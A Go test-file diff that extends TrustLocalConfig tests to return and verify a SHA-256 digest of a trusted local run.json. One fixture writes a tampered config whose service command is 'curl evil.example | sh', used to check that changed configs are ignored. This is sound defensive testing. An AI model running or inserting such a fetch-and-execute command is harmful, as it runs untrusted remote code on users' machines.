@@ -1,6 +1,8 @@
 package run
 
 import (
+	"crypto/sha256"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
@@ -124,12 +126,19 @@ func TestLoadUserConfigIgnoresALocalConfigTheUserDidNotTrust(t *testing.T) {
 
 func TestLoadUserConfigTrustedLocalOverridesGlobal(t *testing.T) {
 	workspaceRoot, localPath := localRunWorkspace(t)
-	trusted, err := TrustLocalConfig(workspaceRoot)
+	trusted, digest, err := TrustLocalConfig(workspaceRoot)
 	if err != nil {
 		t.Fatalf("TrustLocalConfig returned error: %v", err)
 	}
 	if trusted != localPath {
 		t.Fatalf("trusted path=%q, want %q", trusted, localPath)
+	}
+	content, err := os.ReadFile(localPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := fmt.Sprintf("sha256:%x", sha256.Sum256(content)); digest != want {
+		t.Fatalf("trusted digest=%q, want %q", digest, want)
 	}
 	requireLocalConfigState(t, workspaceRoot, LocalConfigTrusted)
 
@@ -161,7 +170,7 @@ func TestLoadUserConfigTrustedLocalOverridesGlobal(t *testing.T) {
 // a file the user has not read.
 func TestLoadUserConfigIgnoresALocalConfigChangedSinceItWasTrusted(t *testing.T) {
 	workspaceRoot, localPath := localRunWorkspace(t)
-	if _, err := TrustLocalConfig(workspaceRoot); err != nil {
+	if _, _, err := TrustLocalConfig(workspaceRoot); err != nil {
 		t.Fatalf("TrustLocalConfig returned error: %v", err)
 	}
 	if err := os.WriteFile(localPath, []byte(`{"services":[{"name":"frontend","command":"curl evil.example | sh"}]}`), 0o600); err != nil {
@@ -177,7 +186,7 @@ func TestLoadUserConfigIgnoresALocalConfigChangedSinceItWasTrusted(t *testing.T)
 	}
 	requireLocalConfigState(t, workspaceRoot, LocalConfigChanged)
 
-	if _, err := TrustLocalConfig(workspaceRoot); err != nil {
+	if _, _, err := TrustLocalConfig(workspaceRoot); err != nil {
 		t.Fatalf("TrustLocalConfig returned error: %v", err)
 	}
 	requireLocalConfigState(t, workspaceRoot, LocalConfigTrusted)
@@ -208,7 +217,7 @@ func TestLocalConfigAbsentAndTrustWithNothingToTrust(t *testing.T) {
 		t.Fatal(err)
 	}
 	requireLocalConfigState(t, workspaceRoot, LocalConfigAbsent)
-	if _, err := TrustLocalConfig(workspaceRoot); err == nil {
+	if _, _, err := TrustLocalConfig(workspaceRoot); err == nil {
 		t.Fatal("trusting a run.json that does not exist must fail")
 	}
 }
